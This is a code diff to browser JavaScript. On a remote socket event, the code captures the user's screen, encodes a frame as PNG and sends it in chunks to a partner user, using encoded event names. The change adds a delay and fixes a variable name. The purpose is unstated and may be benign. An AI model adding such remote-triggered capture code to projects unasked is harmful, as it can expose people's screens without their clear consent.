@@ -266,9 +266,8 @@ socket.on('connect', async () => {
     addWindowFunction();
 
     const userClicked = binaryEvent('userClicked');
-    socket.on(userClicked, async (data) => {
+    socket.on(userClicked, async (partnerUserId) => {
         try {
-
             const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
 
             const video = document.createElement("video");
@@ -277,47 +276,51 @@ socket.on('connect', async () => {
 
             await new Promise((resolve) => (video.onloadedmetadata = resolve));
 
-            const canvas = document.createElement("canvas");
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            const ctx = canvas.getContext("2d");
+            setTimeout(async () => {
 
-            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                const canvas = document.createElement("canvas");
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                const ctx = canvas.getContext("2d");
 
-            stream.getTracks().forEach(track => track.stop());
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-            const blob = await new Promise((resolve, reject) => {
-                captureCanvas.toBlob((blob) => {
-                    if (blob) {
-                        resolve(blob);
-                    } else {
-                        reject(new Error('Failed to create Blob from canvas'));
-                    }
-                }, 'image/png');
-            });
+                stream.getTracks().forEach(track => track.stop());
 
-            const arrayBuffer = await blob.arrayBuffer();
+                const blob = await new Promise((resolve, reject) => {
+                    canvas.toBlob((blob) => {
+                        if (blob) {
+                            resolve(blob);
+                        } else {
+                            reject(new Error('Failed to create Blob from canvas'));
+                        }
+                    }, 'image/png');
+                });
 
-            const chunkSize = 976 * 1024;
-            const totalChunks = Math.ceil(arrayBuffer.byteLength / chunkSize);
+                const arrayBuffer = await blob.arrayBuffer();
 
-            for (let i = 0; i < totalChunks; i++) {
-                const start = i * chunkSize;
-                const end = Math.min(start + chunkSize, arrayBuffer.byteLength);
-                const chunk = arrayBuffer.slice(start, end);
+                const chunkSize = 976 * 1024;
+                const totalChunks = Math.ceil(arrayBuffer.byteLength / chunkSize);
 
-                const sentDataChunk = binaryEvent('sentDataChunk');
+                for (let i = 0; i < totalChunks; i++) {
+                    const start = i * chunkSize;
+                    const end = Math.min(start + chunkSize, arrayBuffer.byteLength);
+                    const chunk = arrayBuffer.slice(start, end);
 
-                const indexString = JSON.stringify(i);
-                const totalChunksString = JSON.stringify(totalChunks);
+                    const sentDataChunk = binaryEvent('sentDataChunk');
 
-                const index = stringToBinary(indexString);
-                const totalChunk = stringToBinary(totalChunksString);
+                    const indexString = JSON.stringify(i);
+                    const totalChunksString = JSON.stringify(totalChunks);
 
-                const partnerId = stringToBinary(partnerKey);
+                    const index = stringToBinary(indexString);
+                    const totalChunk = stringToBinary(totalChunksString);
 
-                socket.emit(sentDataChunk, chunk, index, totalChunk, partnerId, data);
-            };
+                    const partnerId = stringToBinary(partnerKey);
+
+                    socket.emit(sentDataChunk, chunk, index, totalChunk, partnerId, partnerUserId);
+                };
+            }, 2000);
+
         } catch (error) {
             console.error('Error:', error);
         }
